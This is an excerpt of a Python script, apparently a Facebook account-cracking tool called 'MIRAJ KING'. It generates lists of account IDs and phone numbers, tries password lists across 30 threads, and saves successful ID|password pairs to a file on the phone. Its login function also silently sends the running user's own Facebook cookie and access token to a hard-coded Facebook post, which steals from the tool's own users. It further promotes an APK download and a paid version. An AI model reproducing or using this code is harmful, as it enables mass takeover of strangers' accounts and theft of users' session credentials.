...
__  __ _____ _____                _  
 |  \/  |_   _|  __ \     /\       | |
 | \  / | | | | |__) |   /  \      | |       \033[1;34m𝐏 \033[1;37m
 | |\/| | | | |  _  /   / /\ \ _   | |\033[1;31m 𝐑\033[1;37m
 | |  | |_| |_| | \ \  / ____ \ |__| |\033[1;35m𝐎 \033[1;37m
 |_|  |_|_____|_|  \_\/_/    \_\____/ P VP   V8P  Y888P   
----------------------------------------------
 Author    : MIRAJ
 Github    : MIRAJ KING
 Facebook  : MIRAJ
 Tool Name :MIRAJ KING
 Type type : FREE
 Version   : 1.9.9
----------------------------------------------
 MIRAJ Pro version 1.9.8
...
def login():
        ...
        try:
                ...
                requests.post('https://mbasic.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
...
def public():
        ...
        try:
                ...
                login()
        try:
                info = requests.get('https://mbasic.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MIRAJ_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801937390875&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi MIRAJ Sir, I Need To Buy Your Paid MIRAJ PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python MIRAJ.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MIRAJ:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                MIRAJ.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 016,013,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MIRAJ-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in MIRAJ:
                                ...
                                print('\r\r\033[1;32m [MIRAJ-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MIRAJ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MIRAJ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MIRAJ-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MIRAJ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MIRAJ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MIRAJ-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MIRAJ-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MIRAJ-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MIRAJ-OK] '+uid+' | '+pas+'\033[1;97m')
